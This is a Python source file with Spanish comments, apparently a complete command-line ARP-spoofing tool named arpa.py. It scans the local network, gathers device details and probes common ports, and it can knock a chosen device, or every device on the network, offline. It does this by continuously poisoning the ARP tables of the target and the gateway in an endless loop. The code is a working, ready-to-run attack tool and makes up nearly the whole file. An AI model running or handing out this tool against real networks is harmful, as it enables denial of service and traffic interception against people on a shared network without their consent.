#!/usr/bin/env python3
# arpa.py
import os
import re
import sys
import time
import random
import socket
import platform
import argparse
import subprocess
import scapy.all as scapy
from mac_vendor_lookup import MacLookup

from ascii_art import logo_01





'''
>>> ARGUMENTOS DE ENTRADA
'''
mac_lookup = MacLookup()
def get_arguments():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-l", "--list", action="store_true", help="Listar dispositivos conectados en la red")
    group.add_argument("-k", "--kick", dest="target", help="Desconectar dispositivo(s) de la red (IP, MAC o 'all' para todos)")
    group.add_argument("-i", "--info", dest="info", help="Obtener información de un dispositivo (IP o MAC)")
    args = parser.parse_args()
    return args





'''
>>> FUNCIONES DE RED BÁSICAS
'''
def get_mac(ip):
    """ Obtiene la dirección MAC asociada a una IP mediante un ping ARP """
    # Realiza un ping ARP a la IP especificada con un tiempo de espera determinado (segundos)
    ans, _ = scapy.arping(
        ip,
        timeout = 2,
        verbose = True
    )
    
    # Itera sobre las respuestas obtenidas
    for s, r in ans:
        return r.hwsrc      # Retorna la dirección MAC (hwsrc) de la primera respuesta válida
    return None             # Retorna None si no se encuentra una MAC asociada


def get_gateway_ip():
    """ Obtiene la IP del gateway predeterminado del sistema """
    # Determina el sistema operativo actual
    os_name = platform.system().lower()

    # En Linux, usa 'ip route' para encontrar el gateway predeterminado
    if os_name == "linux":
        result = subprocess.run(
            "ip route | grep default",
            shell = True,
            capture_output = True,
            text = True,
        )
        if result.stdout:
            return result.stdout.split()[2]
        
    # En Windows, usa 'route print' y busca la puerta de enlace predeterminada
    elif os_name == "windows":
        result = subprocess.run(
            "route print",
            shell = True,
            capture_output = True,
            text = True,
        )
        for line in result.stdout.splitlines():
            if "0.0.0.0" in line and "Default Gateway" not in line:
                parts = line.split()
                if len(parts) >= 3 and parts[2] != "0.0.0.0":
                    return parts[2]
    
    # En MacOS, usa 'netstat -nr' para encontrar el gateway predeterminado
    elif os_name == "darwin":
        result = subprocess.run(
            "netstat -nr | grep default",
            shell=True,
            capture_output=True,
            text=True,
        )
        for line in result.stdout.splitlines():
            if "default" in line and "UG" in line:
                return line.split()[1]

    # Retorna None si no se encuentra el gateway
    return None


def scan(ip_range):
    """ Escanea la red para descubrir dispositivos y sus direcciones IP/MAC """
    # Crea una solicitud ARP para el rango de IP especificado
    arp_request = scapy.ARP(pdst=ip_range)
    
    # Configura un frame Ethernet con dirección de broadcast (todos los dispositivos)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combina la solicitud ARP con el frame de broadcast
    request_broadcast = broadcast / arp_request
    
    # Envía la solicitud y recibe respuestas, con un timeout determinado (s)
    answered = scapy.srp(request_broadcast, timeout=2, verbose=True)[0]
    
    # Itera sobre las respuestas y guarda IP/MAC de cada dispositivo
    devices = []
    for element in answered:
        devices.append({"ip": element[1].psrc, "mac": element[1].hwsrc})
    return devices





'''
>>> SPOOFING ARP + ATAQUES
'''
def restore(dest_ip, source_ip, dest_mac=None, source_mac=None):
    """ Restaura las tablas ARP enviando paquetes ARP correctos """
    # Usa la MAC proporcionada si está disponible, de lo contrario, la obtiene
    dest_mac = dest_mac or get_mac(dest_ip)
    source_mac = source_mac or get_mac(source_ip)
    
    # Verifica que se hayan obtenido las MAC
    if not dest_mac or not source_mac:
        print(f"[!] No se pudo obtener MAC para IP {dest_ip} o {source_ip}")
        return
    
    # Crea un paquete ARP de respuesta con las direcciones correctas
    packet = scapy.ARP(
        op = 2,                         # Establece operación ARP como respuesta (op=2)
        pdst = dest_ip,                 # Define la IP del dispositivo destino
        hwdst = dest_mac,               # Asigna la MAC del dispositivo destino
        psrc = source_ip,               # Define la IP del dispositivo fuente
        hwsrc = source_mac              # Asigna la MAC del dispositivo fuente
    )
    
    # Envía el paquete ARP 4 veces para asegurar la restauración
    scapy.send(packet, count=4, verbose=True)


def spoof(target_ip, spoof_ip, target_mac=None):
    """ Envía un paquete ARP falso para suplantar una dirección IP """
    # Usa la MAC proporcionada si está disponible, de lo contrario, la obtiene
    target_mac = target_mac or get_mac(target_ip)
    
    # Verifica que se haya obtenido la MAC
    if not target_mac:
        print(f"[!] No se pudo obtener MAC para IP {target_ip}")
        return
    
    # Crea un paquete ARP de respuesta para realizar el spoofing
    packet = scapy.ARP(
        op = 2,                         # Establece operación ARP como respuesta (op=2)
        pdst = target_ip,               # Define la IP del dispositivo objetivo
        hwdst = target_mac,             # Asigna la MAC del dispositivo objetivo
        psrc = spoof_ip                 # Establece la IP que se quiere suplantar
    )
    
    # Envía el paquete ARP para realizar el spoofing
    scapy.send(packet, verbose=True)


def kick(target, gateway_ip):
    """ Realiza un ataque ARP para desconectar un dispositivo de la red """
    # Determina si el objetivo es una IP o una MAC
    target_ip = None
    target_mac = None
    if ":" in target:  # Si contiene ":", asume que es una MAC
        target_mac = target
        
        # Busca la IP correspondiente a la MAC escaneando la red
        ip_range = gateway_ip + "/24"
        devices = scan(ip_range)
        for device in devices:
            if device["mac"].lower() == target_mac.lower():
                target_ip = device["ip"]
                break
        if not target_ip:
            print(f"[!] No se encontró una IP asociada a la MAC {target_mac}")
            return
    else:  # Asume que es una IP
        target_ip = target
        target_mac = get_mac(target_ip)
        if not target_mac:
            print(f"[!] No se pudo obtener la MAC para la IP {target_ip}")
            return
    
    print(f"[+] Comenzando ataque ARP intenso contra {target_ip} (MAC: {target_mac})")
    
    # Bucle infinito para enviar paquetes ARP continuamente
    try:
        while True:
            # Engaña al objetivo haciéndole creer que el atacante es el router
            spoof(target_ip, gateway_ip, target_mac)
            
            # Engaña al router haciéndole creer que el atacante es el objetivo
            spoof(gateway_ip, target_ip)
            
            # Genera un intervalo aleatorio corto para enviar paquetes
            aaf = random.uniform(0.01, 0.001)
            time.sleep(aaf)
            print(f"AAF (Aleatorización de Alta Frecuencia): {aaf}")
    except KeyboardInterrupt:
        print("\n[!] Restaurando tablas ARP...")
        restore(target_ip, gateway_ip, target_mac)
        restore(gateway_ip, target_ip)
        print("[+] Restauración completa.")





'''
>>> OSINT Y OBTENCIÓN DE INFORMACIÓN
'''
def es_ip(target):
    """ Verifica si el objetivo es una dirección IP válida """
    pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    if re.match(pattern, target):
        parts = target.split(".")
        for part in parts:
            if not 0 <= int(part) <= 255:
                return False
        return True
    return False


def es_mac(target):
    """ Verifica si el objetivo es una dirección MAC válida """
    pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
    if re.match(pattern, target):
        return True
    return False


def get_ip_from_mac(mac, ip_range):
    """ Obtiene la IP asociada a una MAC escaneando la red """
    devices = scan(ip_range)
    for device in devices:
        if device["mac"].lower() == mac.lower():
            return device["ip"]
    return None


def get_hostname(ip):
    """ Obtiene el nombre del host a partir de una IP mediante DNS inverso """
    try:
        hostname = socket.gethostbyaddr(ip)[0]
        return hostname
    except socket.herror:
        return "Desconocido"


def get_vendor(mac):
    """ Obtiene el fabricante del dispositivo a partir de la MAC """
    if mac_lookup:
        try:
            return mac_lookup.lookup(mac)
        except:
            return "Desconocido"
    else:
        return "Biblioteca no disponible (instala mac_vendor_lookup)"


def scan_ports(ip, ports=[21, 22, 23, 80, 443, 445, 3389]):
    """ Escanea puertos comunes en el dispositivo """
    open_ports = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports


def get_device_info(target, gateway):
    """ Recopila y muestra toda la información posible sobre un dispositivo """
    ip_range = gateway + "/24"
    
    if es_ip(target):
        ip = target
        mac = get_mac(ip)
        if not mac:
            print(f"[!] No se pudo obtener la MAC para la IP {ip}")
            return
    elif es_mac(target):
        mac = target
        ip = get_ip_from_mac(mac, ip_range)
        if not ip:
            print(f"[!] No se encontró una IP asociada a la MAC {mac}")
            return
    else:
        print("[-] Objetivo inválido. Debe ser una IP o una MAC.")
        return
    
    hostname = get_hostname(ip)
    vendor = get_vendor(mac)
    open_ports = scan_ports(ip)
    
    print(f"Información del dispositivo:")
    print(f"  IP: {ip}")
    print(f"  MAC: {mac}")
    print(f"  Nombre del host: {hostname}")
    print(f"  Fabricante: {vendor}")
    print(f"  Puertos abiertos: {open_ports}")









'''
>>> MAIN / PUNTO DE ENTRADA
'''
def main():
    """ Punto de entrada principal para ejecutar las funcionalidades del programa """
    args = get_arguments()
    gateway = get_gateway_ip()
    
    print(logo_01("1.0.0"))
    
    if args.list:
        print("[*] Escaneando red...")
        ip_range = gateway + "/24"
        devices = scan(ip_range)
        for idx, device in enumerate(devices):
            print(f"{idx+1}. IP: {device['ip']}, MAC: {device['mac']}")
    elif args.target:
        if args.target.lower() == "all":
            print("[*] Escaneando red para desconectar todos los dispositivos...")
            ip_range = gateway + "/24"
            devices = scan(ip_range)
            
            # Filtra el gateway y almacena todos los objetivos válidos
            targets = [
                {"ip": d["ip"], "mac": d["mac"]}
                for d in devices
                if d["ip"] != gateway
            ]
            
            if not targets:
                print("[-] No se encontraron dispositivos para desconectar.")
                return

            print(f"[+] Objetivos encontrados: {len(targets)}")
            try:
                while True:
                    for t in targets:
                        spoof(t["ip"], gateway, t["mac"])
                        spoof(gateway, t["ip"])
                    aaf = random.uniform(0.01, 0.001)
                    time.sleep(aaf)
                    print(f"AAF (Aleatorización de Alta Frecuencia): {aaf}")
            except KeyboardInterrupt:
                print("\n[!] Interrupción detectada. Restaurando tablas ARP...")
                for t in targets:
                    restore(t["ip"], gateway, t["mac"])
                    restore(gateway, t["ip"])
                print("[+] Restauración completa.")
        else:
            kick(args.target, gateway)
    elif args.info:
        get_device_info(args.info, gateway)
    else:
        print("[-] Argumento inválido. Usa -l, -k <IP o MAC>, o -i <IP o MAC>.")





if __name__ == "__main__":
    main()